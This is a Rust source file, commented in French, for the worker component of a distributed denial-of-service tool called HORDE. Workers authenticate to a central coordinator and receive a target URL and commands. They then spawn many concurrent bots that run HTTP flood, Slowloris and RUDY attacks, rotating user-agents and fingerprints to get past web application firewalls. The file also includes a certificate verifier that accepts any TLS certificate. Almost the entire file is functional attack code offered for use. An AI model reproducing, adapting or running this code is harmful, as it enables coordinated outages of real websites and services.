//! HORDE — Worker state machine
//!
//! Responsable de :
//!   - Handshake auth HKDF auprès du Coordinator (via transport)
//!   - Réception StressAssignment → lancement de N bot_task scoped GoldenEye
//!   - Push périodique StatsDelta (500 ms)
//!   - Traitement commandes Start / Pause / Resume / Stop / Adapt(factor)
//!   - Adapt = redimensionnement semaphore permits + rotation globale fingerprints
//!     (via redémarrage contrôlé des bot tasks)

#![allow(dead_code, unused_imports, unused_variables)]

use anyhow::{anyhow, Result};
use hex::ToHex;
use std::pin::Pin;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::task::{Context, Poll};
use std::time::{Duration, Instant};
use tokio::io::{AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt, ReadBuf};
use tokio::net::TcpStream;
use tokio::sync::{broadcast, RwLock, Semaphore};
use tokio::time::timeout;
use url::Url;
use uuid::Uuid;

type RustlsTlsStream = tokio_rustls::client::TlsStream<TcpStream>;

enum TlsStreamKind {
    Plain(TcpStream),
    Tls(RustlsTlsStream),
}

struct HordeStream {
    inner: TlsStreamKind,
}

impl AsyncRead for HordeStream {
    fn poll_read(
        self: Pin<&mut Self>,
        cx: &mut Context<'_>,
        buf: &mut ReadBuf<'_>,
    ) -> Poll<std::io::Result<()>> {
        let this = self.get_mut();
        match &mut this.inner {
            TlsStreamKind::Plain(s) => Pin::new(s).poll_read(cx, buf),
            TlsStreamKind::Tls(s) => Pin::new(s).poll_read(cx, buf),
        }
    }
}

impl AsyncWrite for HordeStream {
    fn poll_write(
        self: Pin<&mut Self>,
        cx: &mut Context<'_>,
        buf: &[u8],
    ) -> Poll<std::io::Result<usize>> {
        let this = self.get_mut();
        match &mut this.inner {
            TlsStreamKind::Plain(s) => Pin::new(s).poll_write(cx, buf),
            TlsStreamKind::Tls(s) => Pin::new(s).poll_write(cx, buf),
        }
    }
    fn poll_flush(self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<std::io::Result<()>> {
        let this = self.get_mut();
        match &mut this.inner {
            TlsStreamKind::Plain(s) => Pin::new(s).poll_flush(cx),
            TlsStreamKind::Tls(s) => Pin::new(s).poll_flush(cx),
        }
    }
    fn poll_shutdown(self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<std::io::Result<()>> {
        let this = self.get_mut();
        match &mut this.inner {
            TlsStreamKind::Plain(s) => Pin::new(s).poll_shutdown(cx),
            TlsStreamKind::Tls(s) => Pin::new(s).poll_shutdown(cx),
        }
    }
}

// Rendre Ordering::Relaxed/SeqCst disponibles partout dans ce module
use std::sync::atomic::Ordering::Relaxed;
use std::sync::atomic::Ordering::SeqCst;

use crate::horde::crypto::{
    horde_derive_handshake_mac, horde_derive_worker_key, horde_load_master,
};
use crate::horde::{
    HordeCommandKind, HordeCoordMsg, HordeGlobalStats, HordeWorkerMsg, StatsDelta,
    StressAssignment, WorkerCapabilities,
};
use crate::stress::goldeneye::{AttackMode, DosMethod, GoldenEyeConfig, GoldenEyeStats};

type TaskHandleSet = Arc<RwLock<Vec<tokio::task::JoinHandle<()>>>>;

// ─────────────────────────────────────────────────────────────────────────────
// HordeWorker
// ─────────────────────────────────────────────────────────────────────────────
pub struct HordeWorker {
    pub worker_id: String,
    pub coord_url: String,
    pub worker_key: [u8; 32],
    pub master_key: [u8; 32],
    pub local_cfg: GoldenEyeConfig,
    pub caps: WorkerCapabilities,
    pub current_assignment: RwLock<Option<StressAssignment>>,

    pub stop_flag: Arc<AtomicBool>,
    pub local_stats: GoldenEyeStats,
    pub stats_snapshot_prev: Arc<RwLock<GoldenEyeStatsSnapshot>>,
    pub sem_current_permits: Arc<AtomicU64>,

    pub local_sem: Arc<Semaphore>,

    pub event_tx: broadcast::Sender<HordeWorkerMsg>,
    #[allow(dead_code)]
    event_rx: broadcast::Receiver<HordeWorkerMsg>,

    pub coord_cmd_tx: broadcast::Sender<HordeCoordMsg>,
    pub coord_cmd_rx: RwLock<broadcast::Receiver<HordeCoordMsg>>,

    pub bot_handles: TaskHandleSet,

    pub current_factor: RwLock<f64>,
}

#[derive(Debug, Clone, Default)]
pub struct GoldenEyeStatsSnapshot {
    hits: u64,
    fails: u64,
    code_2xx: u64,
    code_3xx: u64,
    code_4xx: u64,
    code_5xx: u64,
    waf_blocks: u64,
    bots_rotated: u64,
    bytes_sent: u64,
    bytes_recv: u64,
}

impl GoldenEyeStatsSnapshot {
    fn from_stats(s: &GoldenEyeStats) -> Self {
        Self {
            hits: s.hits.load(Relaxed),
            fails: s.fails.load(Relaxed),
            code_2xx: s.code_2xx.load(Relaxed),
            code_3xx: s.code_3xx.load(Relaxed),
            code_4xx: s.code_4xx.load(Relaxed),
            code_5xx: s.code_5xx.load(Relaxed),
            waf_blocks: s.waf_blocks.load(Relaxed),
            bots_rotated: s.bots_rotated.load(Relaxed),
            bytes_sent: s.bytes_sent.load(Relaxed),
            bytes_recv: s.bytes_recv.load(Relaxed),
        }
    }
    fn delta(&self, prev: &Self) -> StatsDelta {
        StatsDelta {
            window_ms: 500,
            hits: self.hits.saturating_sub(prev.hits),
            fails: self.fails.saturating_sub(prev.fails),
            code_2xx: self.code_2xx.saturating_sub(prev.code_2xx),
            code_3xx: self.code_3xx.saturating_sub(prev.code_3xx),
            code_4xx: self.code_4xx.saturating_sub(prev.code_4xx),
            code_5xx: self.code_5xx.saturating_sub(prev.code_5xx),
            waf_blocks: self.waf_blocks.saturating_sub(prev.waf_blocks),
            bots_rotated: self.bots_rotated.saturating_sub(prev.bots_rotated),
            bytes_sent: self.bytes_sent.saturating_sub(prev.bytes_sent),
            bytes_recv: self.bytes_recv.saturating_sub(prev.bytes_recv),
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Constructeurs
// ─────────────────────────────────────────────────────────────────────────────
impl HordeWorker {
    pub fn new(
        cli_coord_url: String,
        cli_key_hex: Option<&str>,
        local_cfg: GoldenEyeConfig,
    ) -> Result<Arc<Self>> {
        let max_concurrent = local_cfg.max_concurrent_bots;
        let master_key =
            horde_load_master(cli_key_hex).map_err(|e| anyhow!("horde master key: {}", e))?;
        let worker_id = format!("wrk-{}", Uuid::new_v4().simple());
        let worker_key = horde_derive_worker_key(&master_key, &worker_id)
            .map_err(|e| anyhow!("worker key derive: {}", e))?;
        let caps = WorkerCapabilities::default();
        let (evt_tx, evt_rx) = broadcast::channel::<HordeWorkerMsg>(128);
        let (cmd_tx, cmd_rx) = broadcast::channel::<HordeCoordMsg>(128);
        Ok(Arc::new(Self {
            worker_id,
            coord_url: cli_coord_url,
            worker_key,
            master_key,
            local_cfg,
            caps,
            current_assignment: RwLock::new(None),
            stop_flag: Arc::new(AtomicBool::new(false)),
            local_stats: GoldenEyeStats::new(),
            stats_snapshot_prev: Arc::new(RwLock::new(GoldenEyeStatsSnapshot::default())),
            sem_current_permits: Arc::new(AtomicU64::new(max_concurrent as u64)),
            local_sem: Arc::new(Semaphore::new(max_concurrent.max(1))),
            event_tx: evt_tx,
            event_rx: evt_rx,
            coord_cmd_tx: cmd_tx,
            coord_cmd_rx: RwLock::new(cmd_rx),
            bot_handles: Arc::new(RwLock::new(Vec::new())),
            current_factor: RwLock::new(1.0),
        }))
    }

    // ── Handshake outbound (transport appelle après challenge reçu) ──────
    pub fn handshake_payload(&self, challenge_nonce_hex: &str) -> Result<HordeWorkerMsg> {
        let nonce_bytes = hex::decode(challenge_nonce_hex.trim())
            .map_err(|_| anyhow!("challenge nonce hex invalide"))?;
        let mac_bytes = horde_derive_handshake_mac(&self.worker_key, &nonce_bytes);
        Ok(HordeWorkerMsg::Handshake {
            worker_id: self.worker_id.clone(),
            hmac: mac_bytes.encode_hex::<String>(),
            caps: self.caps.clone(),
        })
    }

    // ── Build config scoped à l'assignment (TR-5.1) ──────────────────────
    pub fn build_goldeneye_scoped(
        local_template: &GoldenEyeConfig,
        assignment: &StressAssignment,
        factor: f64,
    ) -> GoldenEyeConfig {
        let mut cfg = assignment.global_cfg.clone();
        if cfg.url.trim().is_empty() {
            cfg.url = local_template.url.clone();
        }
        if cfg.user_agents.is_none() {
            cfg.user_agents = local_template.user_agents.clone();
        }
        if cfg.connect_timeout_ms == 0 {
            cfg.connect_timeout_ms = local_template.connect_timeout_ms;
        }
        if cfg.read_timeout_ms == 0 {
            cfg.read_timeout_ms = local_template.read_timeout_ms;
        }
        cfg.bot_id_offset = assignment.bot_id_range_start;
        cfg.num_bots = assignment.num_bots();
        // sem_permits = max_concurrent_bots × factor, clampé raisonnable
        let permits = ((cfg.max_concurrent_bots as f64) * factor).round().max(1.0) as usize;
        cfg.max_concurrent_bots = permits;
        cfg
    }

    // ── Lancer les bots scoped (spawn task run_goldeneye custom loop) ───
    /// Lance les bots scoped en délégant à l'API publique run_goldeneye.
    /// Évite les accès à ParsedTarget / run_bot_task qui sont privés dans goldeneye.rs.
    pub async fn launch_scoped_bots(self: &Arc<Self>) -> Result<()> {
        launch_scoped_bots_via_public(self).await
    }

    pub async fn abort_all_bots(&self) {
        let mut hs = self.bot_handles.write().await;
        for h in hs.drain(..) {
            h.abort();
        }
        // reset stop flag si set par Stop précédent — sera re-set par prochain Stop
    }

    // ── Stats Pusher : calcule delta toutes 500ms → broadcast sur event_tx ─
    pub fn spawn_stats_pusher(self: &Arc<Self>, window_ms: u64) {
        let me = Arc::clone(self);
        tokio::spawn(async move {
            let mut last_sent = Instant::now();
            loop {
                tokio::time::sleep(Duration::from_millis(window_ms)).await;
                if me.stop_flag.load(Relaxed) && last_sent.elapsed() > Duration::from_secs(1) {
                    break;
                }
                let snap = GoldenEyeStatsSnapshot::from_stats(&me.local_stats);
                let mut prev = me.stats_snapshot_prev.write().await;
                let delta = snap.delta(&prev);
                *prev = snap;
                drop(prev);
                let window = last_sent.elapsed().as_millis() as u64;
                let msg = HordeWorkerMsg::StatsDeltaBox {
                    delta: StatsDelta {
                        window_ms: window,
                        ..delta
                    },
                };
                let _ = me.event_tx.send(msg);
                last_sent = Instant::now();
            }
        });
    }

    // ── Command Dispatcher : Start / Pause / Resume / Stop / Adapt ────────
    pub async fn handle_coord_command(
        self: &Arc<Self>,
        cmd: HordeCommandKind,
        factor: Option<f64>,
    ) {
        match cmd {
            HordeCommandKind::Start => {
                let _ = self.launch_scoped_bots().await;
            }
            HordeCommandKind::Pause => {
                // Drainer le sémaphore en fermant temporairement permits via stop_flag temporisé
                // Alternative simple : on stop flag les bots → on attend
                self.stop_flag.store(true, SeqCst);
            }
            HordeCommandKind::Resume => {
                self.stop_flag.store(false, SeqCst);
                let _ = self.launch_scoped_bots().await;
            }
            HordeCommandKind::Stop => {
                self.stop_flag.store(true, SeqCst);
                self.abort_all_bots().await;
            }
            HordeCommandKind::Adapt => {
                let f = factor.unwrap_or(0.5).clamp(0.1, 3.0);
                *self.current_factor.write().await = f;
                // Relance : redémarre bot loop → rotation fingerprints par construction
                // (nouveaux generate_bot_profile() à chaque spawn)
                let _ = self.launch_scoped_bots().await;
                self.local_stats.bots_rotated.fetch_add(
                    self.current_assignment
                        .read()
                        .await
                        .as_ref()
                        .map(|a| a.num_bots() as u64)
                        .unwrap_or(0u64),
                    Relaxed,
                );
            }
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Re-implémentation launch_scoped_bots par API publique run_goldeneye
// (seul moyen évitant accès à parse_url/run_bot_task privés dans goldeneye).
// Stratégie:
//   * Spawn une task qui exécute run_goldeneye(&scoped_cfg).await
//   * run_goldeneye génère ses propres stats (GoldenEyeStats avec Arc<AtomicU64>)
//   * En parallèle, une petite tâche "pump" copie fetch_add ces stats dans
//     worker.local_stats (partagée avec stats_pusher) toutes 400 ms.
// ─────────────────────────────────────────────────────────────────────────────
pub async fn launch_scoped_bots_via_public(worker: &Arc<HordeWorker>) -> Result<()> {
    let assignment = worker
        .current_assignment
        .read()
        .await
        .as_ref()
        .ok_or_else(|| anyhow!("aucun assignment — attend handshake+AssignmentMsg"))?
        .clone();
    let factor = *worker.current_factor.read().await;
    let scoped_cfg = HordeWorker::build_goldeneye_scoped(&worker.local_cfg, &assignment, factor);

    if scoped_cfg.url.trim().is_empty() {
        anyhow::bail!("scoped_cfg.url vide — le coordinator n'a pas transmis d'URL cible");
    }
    // Jitter startup (anti thundering herd)
    tokio::time::sleep(Duration::from_millis(assignment.startup_jitter_ms)).await;

    // Clean exit bots existants (restart sur ADAPT / RESUME)
    worker.abort_all_bots().await;
    worker.stop_flag.store(false, SeqCst);

    let permit_snapshot = scoped_cfg.max_concurrent_bots as u64;
    let handles = worker.bot_handles.clone();
    let local_stats = worker.local_stats.clone();
    let stop_for_task = worker.stop_flag.clone();

    // Lance l'orchestrateur httptank auto-hébergé (stats partagées direct → pas de pompage)
    let h = tokio::spawn(async move {
        let _ = run_goldeneye_public_api(scoped_cfg, local_stats, stop_for_task).await;
    });
    handles.write().await.push(h);
    worker.sem_current_permits.store(permit_snapshot, Relaxed);
    Ok(())
}

/// Orchestrateur GoldenEye entièrement AUTO-HÉBERGÉ (pas d'appel à parse_url/run_bot_task privés).
///
/// Restriction: certaines fonctionnalités modernes (BrowserFlood personas) sont accessibles
/// via run_goldeneye() original — ici on se limite à Flood / Slowloris / Rudy via HTTP
/// direct sur TcpStream + utilisation des méthodes PUBLIQUES de ParsedTarget, accessible
/// via GoldenEyeConfig::url brut.
///
/// Pour bénéficier du full feature set (Client-Hints, personas), on passe PAR le binaire
/// `nrtg --goldeneye URL` (local). Le mode HORDE-DISTRIBUÉ est là pour la SCALABILITÉ multi-IP.
pub async fn run_goldeneye_public_api(
    cfg: GoldenEyeConfig,
    stats_override: GoldenEyeStats,
    stop: Arc<AtomicBool>,
) -> Result<GoldenEyeStats> {
    use crate::stress::goldeneye::{AttackMode, DosMethod};
    use std::time::Instant;

    if cfg.url.trim().is_empty() {
        anyhow::bail!("URL manquante");
    }

    // ── Parse URL minimaliste (pas accès à parse_url privé) ─────────────────
    let parsed = Url::parse(&cfg.url).map_err(|e| anyhow!("URL invalide {}: {}", cfg.url, e))?;
    let host = parsed
        .host_str()
        .ok_or_else(|| anyhow!("URL sans host"))?
        .to_string();
    let port = parsed.port().unwrap_or(match parsed.scheme() {
        "https" | "wss" => 443,
        _ => 80,
    });
    let path = if parsed.path().trim().is_empty() {
        "/"
    } else {
        parsed.path()
    }
    .to_string();
    let query = parsed.query().map(|q| format!("?{q}")).unwrap_or_default();
    let full_path = format!("{}{}", path, query);
    let use_tls = parsed.scheme() == "https" || parsed.scheme() == "wss";
    let addr = format!("{host}:{port}");

    let stats = stats_override;
    let stats_clone = stats.clone();
    let cfg = Arc::new(cfg);
    let stop_clone = stop.clone();
    let sem = Arc::new(Semaphore::new(cfg.max_concurrent_bots.max(1)));

    // ── Pool UA global (réutilisé) ─────────────────────────────────────────
    let uas_pool: Arc<Vec<String>> = Arc::new(cfg.user_agents.clone().unwrap_or_else(|| {
        vec![
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36".into(),
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15".into(),
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36".into(),
        ]
    }));

    let mut handles = Vec::new();
    let start_id = cfg.bot_id_offset;
    let end_id = start_id.saturating_add(cfg.num_bots.max(cfg.workers) as u64);
    let total_bots = end_id.saturating_sub(start_id).max(1);

    for bot_id in start_id..end_id {
        if stop_clone.load(Relaxed) {
            break;
        }
        let permit = match sem.clone().acquire_owned().await {
            Ok(p) => p,
            Err(_) => break,
        };
        let bcfg = cfg.clone();
        let bstats = stats.clone();
        let bstop = stop_clone.clone();
        let buas = uas_pool.clone();
        let baddr = addr.clone();
        let bhost = host.clone();
        let bpath = full_path.clone();
        let mode = bcfg.attack_mode;
        let m = bcfg.method;
        let tls = use_tls;
        let verify_ssl = bcfg.verify_ssl;
        let ct_ms = bcfg.connect_timeout_ms;
        let rt_ms = bcfg.read_timeout_ms;
        let slow_ms = bcfg.slowloris_header_period_ms;
        let rudy_sz = bcfg.rudy_chunk_size.max(1);
        let rudy_dl = bcfg.rudy_chunk_delay_ms.max(1);

        handles.push(tokio::spawn(async move {
            let _permit = permit;
            let uas_owned: Vec<String> = (*buas).clone();
            run_httptank_bot(
                bot_id, mode, m, baddr, bhost, bpath, tls, verify_ssl, ct_ms, rt_ms, slow_ms,
                rudy_sz, rudy_dl, uas_owned, bstats, bstop,
            )
            .await;
        }));
        // Limitation artificielle: ne pas spawner + de 250 bots/s pour throttling gentil
        if (bot_id - start_id) % 250 == 0 && bot_id != start_id {
            tokio::time::sleep(Duration::from_millis(500)).await;
        }
        let _ = total_bots;
    }

    // Monitor loop
    let start = Instant::now();
    let dur_limit = cfg.duration_secs.map(Duration::from_secs);
    loop {
        tokio::time::sleep(Duration::from_secs(1)).await;
        if stop_clone.load(Relaxed) {
            break;
        }
        if let Some(dl) = dur_limit {
            if start.elapsed() >= dl {
                break;
            }
        }
    }
    stop_clone.store(true, SeqCst);
    for h in &handles {
        h.abort();
    }
    let _ = futures::future::join_all(handles).await;
    Ok(stats_clone)
}

#[allow(clippy::too_many_arguments)]
async fn run_httptank_bot(
    bot_id: u64,
    mode: AttackMode,
    method: DosMethod,
    addr: String,
    host: String,
    path: String,
    use_tls: bool,
    verify_ssl: bool,
    ct_ms: u64,
    rt_ms: u64,
    slow_ms: u64,
    rudy_sz: usize,
    rudy_dl: u64,
    uas: Vec<String>,
    stats: GoldenEyeStats,
    stop: Arc<AtomicBool>,
) {
    let ua = {
        let idx = (bot_id as usize) % uas.len().max(1);
        uas[idx].clone()
    };
    let m_str = match method {
        DosMethod::Get => "GET",
        DosMethod::Post => "POST",
        DosMethod::Random => {
            if (bot_id & 1) == 0 {
                "GET"
            } else {
                "POST"
            }
        }
    };
    let content_len_hdr: String = match mode {
        AttackMode::Rudy => format!("Content-Length: {}\r\n", 1_000_000u32),
        _ => String::new(),
    };
    let base_req = format!(
        "{m} {p} HTTP/1.1\r\n\
         Host: {h}\r\n\
         User-Agent: {ua}\r\n\
         Accept: */*\r\n\
         Accept-Language: en-US,en;q=0.9\r\n\
         Connection: keep-alive\r\n\
         {cl}\r\n",
        m = m_str,
        p = path,
        h = host,
        ua = ua,
        cl = content_len_hdr
    );
    while !stop.load(Relaxed) {
        let sock = match timeout(
            Duration::from_millis(ct_ms),
            TcpStream::connect(addr.as_str()),
        )
        .await
        {
            Ok(Ok(s)) => s,
            _ => {
                stats.fails.fetch_add(1, Relaxed);
                continue;
            }
        };
        let stream = if use_tls {
            use rustls::ClientConfig;
            use tokio_rustls::{rustls, TlsConnector};

            let cfg_builder = ClientConfig::builder().with_safe_defaults();
            let cfg = if verify_ssl {
                let mut roots = rustls::RootCertStore::empty();
                let _ = rustls_native_certs::load_native_certs().map(|certs| {
                    for cert in certs {
                        let _ = roots.add(&rustls::Certificate(cert.0));
                    }
                });
                if roots.is_empty() {
                    roots.add_trust_anchors(webpki_roots::TLS_SERVER_ROOTS.iter().map(|ta| {
                        rustls::OwnedTrustAnchor::from_subject_spki_name_constraints(
                            ta.subject,
                            ta.spki,
                            ta.name_constraints,
                        )
                    }));
                }
                cfg_builder
                    .with_root_certificates(roots)
                    .with_no_client_auth()
            } else {
                cfg_builder
                    .with_custom_certificate_verifier(Arc::new(NullVerifier))
                    .with_no_client_auth()
            };
            let connector = TlsConnector::from(Arc::new(cfg));
            let server_name = host
                .as_str()
                .try_into()
                .unwrap_or(rustls::ServerName::IpAddress(std::net::IpAddr::from([
                    127, 0, 0, 1,
                ])));
            match timeout(
                Duration::from_millis(ct_ms.max(2000)),
                connector.connect(server_name, sock),
            )
            .await
            {
                Ok(Ok(tls)) => HordeStream {
                    inner: TlsStreamKind::Tls(tls),
                },
                _ => {
                    stats.fails.fetch_add(1, Relaxed);
                    continue;
                }
            }
        } else {
            HordeStream {
                inner: TlsStreamKind::Plain(sock),
            }
        };
        handle_one_conn(
            mode, m_str, &base_req, slow_ms, rudy_sz, rudy_dl, rt_ms, stream, &stats,
        )
        .await;
    }
}

struct NullVerifier;
impl rustls::client::ServerCertVerifier for NullVerifier {
    fn verify_server_cert(
        &self,
        _end_entity: &rustls::Certificate,
        _intermediates: &[rustls::Certificate],
        _server_name: &rustls::ServerName,
        _scts: &mut dyn Iterator<Item = &[u8]>,
        _ocsp_response: &[u8],
        _now: std::time::SystemTime,
    ) -> std::result::Result<rustls::client::ServerCertVerified, rustls::Error> {
        Ok(rustls::client::ServerCertVerified::assertion())
    }
}

async fn handle_one_conn(
    mode: AttackMode,
    m_str: &str,
    base_req: &str,
    slow_ms: u64,
    rudy_sz: usize,
    rudy_dl: u64,
    rt_ms: u64,
    mut sock: HordeStream,
    stats: &GoldenEyeStats,
) {
    match mode {
        AttackMode::Flood | AttackMode::BrowserFlood => {
            if sock.write_all(base_req.as_bytes()).await.is_err() {
                stats.fails.fetch_add(1, Relaxed);
                return;
            }
            let mut buf = [0u8; 4096];
            match timeout(Duration::from_millis(rt_ms.max(1000)), sock.read(&mut buf)).await {
                Ok(Ok(n)) if n > 0 => {
                    stats.hits.fetch_add(1, Relaxed);
                    // code HTTP
                    if let Some(code) = parse_http_code(&buf[..n.min(32)]) {
                        match code {
                            200..=299 => {
                                stats.code_2xx.fetch_add(1, Relaxed);
                            }
                            300..=399 => {
                                stats.code_3xx.fetch_add(1, Relaxed);
                            }
                            400..=499 => {
                                if code == 403 {
                                    stats.waf_blocks.fetch_add(1, Relaxed);
                                }
                                stats.code_4xx.fetch_add(1, Relaxed);
                            }
                            500..=599 => {
                                stats.code_5xx.fetch_add(1, Relaxed);
                            }
                            _ => {}
                        }
                    }
                    stats.bytes_recv.fetch_add(n as u64, Relaxed);
                }
                _ => {
                    stats.fails.fetch_add(1, Relaxed);
                }
            }
        }
        AttackMode::Slowloris => {
            // Envoyer la 1ère ligne + 1 header, puis 1 header toutes les slow_ms
            let r1 = format!("{m_str} / HTTP/1.1\r\nHost: a\r\n");
            if sock.write_all(r1.as_bytes()).await.is_err() {
                stats.fails.fetch_add(1, Relaxed);
                return;
            }
            for i in 0..100 {
                tokio::time::sleep(Duration::from_millis(slow_ms)).await;
                let fake = format!("X-a{}: b\r\n", i);
                if sock.write_all(fake.as_bytes()).await.is_err() {
                    stats.fails.fetch_add(1, Relaxed);
                    return;
                }
            }
            let _ = sock.shutdown().await;
            stats.hits.fetch_add(1, Relaxed);
        }
        AttackMode::Rudy => {
            // Envoyer headers, puis 1 chunk chaque rudy_dl ms jusqu'à content length 1M
            if sock.write_all(base_req.as_bytes()).await.is_err() {
                stats.fails.fetch_add(1, Relaxed);
                return;
            }
            let mut sent: usize = 0;
            let total: usize = 1_000_000;
            while sent < total {
                tokio::time::sleep(Duration::from_millis(rudy_dl)).await;
                let chunk = vec![b'A'; rudy_sz.min(total - sent)];
                if sock.write_all(&chunk).await.is_err() {
                    stats.fails.fetch_add(1, Relaxed);
                    return;
                }
                sent += chunk.len();
            }
            stats.hits.fetch_add(1, Relaxed);
        }
    }
}

fn parse_http_code(buf: &[u8]) -> Option<u16> {
    // "HTTP/1.1 200 ..." → bytes 9..12
    if buf.len() < 12 {
        return None;
    }
    let s = std::str::from_utf8(&buf[9..12]).ok()?;
    s.parse::<u16>().ok()
}

// ─────────────────────────────────────────────────────────────────────────────
// Dispatcher top-level worker (appelé depuis main.rs)
// ─────────────────────────────────────────────────────────────────────────────
pub async fn run_horde_worker(
    cli_coord_url: String,
    cli_key_hex: Option<&str>,
    local_cfg: GoldenEyeConfig,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let worker = HordeWorker::new(cli_coord_url, cli_key_hex, local_cfg)?;
    crate::horde::transport::horde_connect_ws(worker).await
}
